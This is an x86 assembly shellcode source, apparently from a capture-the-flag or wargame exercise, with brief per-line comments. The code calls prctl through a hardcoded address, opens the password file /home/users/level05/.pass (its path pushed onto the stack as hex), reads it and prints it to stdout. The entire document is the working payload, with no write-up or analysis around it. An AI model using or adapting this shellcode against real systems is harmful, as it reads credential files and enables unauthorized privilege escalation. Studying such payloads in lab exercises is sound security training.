section .text
	global _start

_start:

xor eax, eax			;Setting call to prctl
push eax
push 0x1
mov eax, 0x08048540
call eax

cld						;Reset direction flag

xor eax, eax			;Cleaning registers
xor ebx, ebx
xor ecx, ecx
xor edx, edx

mov edi, esp			;Setting read buffer
sub edi, 64
mov cl, 64
rep stosb

push eax				;Setting path_to_file into stack ie : /home/users/level05/.pass
push 0x00000073
push 0x7361702e
push 0x2f35306c
push 0x6576656c
push 0x2f737265
push 0x73752f65
push 0x6d6f682f

mov al, 0x5				;Setting syscall to open file
mov ebx, esp
xor ecx, ecx
xor edx, edx
int	0x80

mov ebx, eax			;Setting syscall to read file
mov ecx, esp
sub ecx, 64
mov edi, ecx			;Saves buffer addr in edi
mov dl, 63
mov al, 0x3
int	0x80

xor eax, eax			;Cleaning registers
xor ebx, ebx
xor ecx, ecx
xor edx, edx

mov al, 0x4				;Setting write buffer in stdout
mov ecx, edi
mov dl, 63
mov bl, 0x1
int	0x80

xor eax, eax			;Setting call to exit
mov al, 0x1
int 0x80
